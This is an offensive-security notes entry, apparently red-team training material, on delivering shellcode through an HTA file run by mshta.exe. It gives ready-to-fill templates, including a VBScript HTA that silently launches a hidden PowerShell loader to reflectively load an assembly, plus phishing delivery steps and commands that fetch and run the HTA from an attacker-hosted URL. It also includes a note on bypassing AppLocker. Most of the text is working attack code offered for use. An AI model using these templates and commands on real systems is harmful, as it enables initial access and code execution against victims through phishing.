# 07.03 Custom HTA Embedded Shellcode Runner

> HTA file containing JScript that loads a .NET runner — fired via mshta.exe LOLBin.

## Overview

HTA (HTML Application) wraps the JScript runner pattern in an .hta file. mshta.exe is a signed Microsoft binary present on every Windows install; it executes HTAs with full COM/ActiveX access. Excellent for AppLocker bypass (mshta is a default-allowed LOLBIN) and as a click-through phishing payload. Pairs with DotNetToJScript output or pure-VBScript shellcode runners.

## Steps

- **Step 1** - Build the .NET assembly (same as JScript runner).
- **Step 2** - Convert with DotNetToJScript to get JScript blob.
- **Step 3** - Wrap in HTA template.
- **Step 4** - Host on attacker; deliver URL via phishing or shortcut.
- **Step 5** - On target: mshta http://<ATTACKER>/payload.hta

## Commands

### Pure VBScript shellcode HTA

```html
<html><head>
<title>Update</title>
<HTA:APPLICATION ID='HTA' BORDER='none' INNERBORDER='no' MAXIMIZEBUTTON='no' MINIMIZEBUTTON='no' SHOWINTASKBAR='no'/>
<script language="VBScript">
Sub Window_OnLoad
    Const VirtualAllocFlags = &H40   ' PAGE_EXECUTE_READWRITE
    Set sh = CreateObject("WScript.Shell")
    cmd = "powershell -nop -w hidden -c ""$b=[byte[]](_REPLACE_WITH_BYTES_); $a=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length); [System.Runtime.InteropServices.Marshal]::Copy($b,0,$a,$b.Length); $r=[Activator]::CreateInstance([Reflection.Assembly]::Load($b).GetType('Runner'))"""
    sh.Run cmd, 0, False
    window.close()
End Sub
</script>
</head></html>
```

### DotNetToJScript-style HTA

```html
<html><head>
<title>doc</title>
<HTA:APPLICATION ID='HTA' WINDOWSTATE='minimize' SHOWINTASKBAR='no'/>
<script language="JScript">
<!-- BEGIN DotNetToJScript output -->
// (replace this with output of DotNetToJScript.exe runner.dll -l=JScript -c=ShellcodeRunner)
<!-- END -->
window.close();
</script>
</head></html>
```

### Execute

```cmd
REM From local file
mshta.exe payload.hta

REM Or directly from URL (no local artifact)
mshta.exe http://<ATTACKER>/payload.hta

REM Or via shortcut: create .lnk with target:
REM C:\Windows\System32\mshta.exe http://<ATTACKER>/p.hta
```

### AppLocker bypass note

```text
mshta.exe is listed in Microsoft's recommended block-list for AppLocker — but is NOT in the default-deny rules on most enterprises
Default AppLocker rules allow C:\Windows\System32\mshta.exe
If AppLocker is custom-tuned, the bypass fails — check with: Get-AppLockerPolicy -Effective
```
